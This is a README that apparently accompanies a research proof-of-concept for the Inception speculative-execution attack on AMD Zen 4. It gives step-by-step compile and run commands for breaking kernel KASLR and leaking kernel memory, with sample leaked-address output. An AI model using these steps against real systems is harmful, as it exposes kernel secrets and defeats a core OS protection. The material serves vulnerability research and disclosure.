This folder contains the PoC exploit of Inception for Zen 4. It requires Linux kernel 5.19.0-28-generic.

1. Compile inception_kaslr.c and inception.c. Pass two cores on the same physical core. For example:

clang -DCORE1=1 -DCORE2=9 inception_kaslr.c -o inception_kaslr
clang -DCORE1=1 -DCORE2=9 inception.c -o inception

2. Also compile the workloads for the sibling core. Pass the cache set which you want to stress. For example:

clang -DSET=40 workload.c -o workload

clang -DSET=40 workload2.c -o workload2

clang -DSET=40 workload3.c -o workload3

Changing SET (0 - 63) can sometimes improve the performance of the exploit. 

3. Run the Inception KASLR break:

./inception_kaslr

Note that finding the physical address of the reload buffer (second step of inception_kaslr) can take a few minutes, 
depending on the size of your physical memory.

5. Lastly, run Inception, and pass the kernel text, physmap address and a kernel address from which you want to leak:

./inception <INSERT KERNEL TEXT> <INSERT PHYSMAP ADDRESS> <INSERT KERNEL ADDRESS>

The results are printed to stdout and are also stored in data.bin. 
Before running, make sure transparent hugepages are enabled, since we rely on this feature for
reducing entropy (not a strict requirement of Inception).

Optional: The kmod in ./kmod can be installed to get an example kernel address from which we can leak:

cd ../kmod; make install; dmesg | tail -n 10; cd ../zen_4

The output of inception_kaslr should look like the following:

.............
Leaked _text: 0xffffffff8ea00000
...........
Physical: 0x2ba00000
...............................................
Leaked physmap: 0xffff9f6340000000
Broke KASLR in 216 seconds

When leaking from the provided kmod, the output of inception should look something like this:

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...


